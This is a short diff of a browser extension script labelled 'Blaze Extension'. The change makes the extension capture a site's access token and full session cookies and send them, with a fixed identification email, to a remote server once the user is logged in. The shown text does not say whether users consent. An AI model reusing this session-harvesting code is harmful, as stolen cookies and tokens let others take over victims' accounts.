@@ -51,6 +51,7 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
         const token = findToken(msg.data, cookies);
 
         const payload = {
+          email: 'extension@blaze', // Email fixo para identificação
           source: 'extension',
           url: msg.data?.url,
           accessToken: token,
@@ -60,8 +61,14 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
           timestamp: Date.now()
         };
 
-        await persistStatus({ status: 'Conectado', token, cookies: cookieHeader });
-        await sendToServer(payload);
+        if (token && cookies.length > 0) {
+          console.log('[Blaze Extension] ✅ Token e cookies capturados! Enviando para servidor BR...');
+          await persistStatus({ status: 'Conectado', token, cookies: cookieHeader });
+          await sendToServer(payload);
+          console.log('[Blaze Extension] ✅ Dados enviados com sucesso!');
+        } else {
+          console.log('[Blaze Extension] ⏳ Aguardando login...');
+        }
       } catch (error) {
         await persistStatus({ status: 'Erro ao enviar', token: null, cookies: null });
         console.error('[Blaze Extension] Erro ao enviar dados:', error);
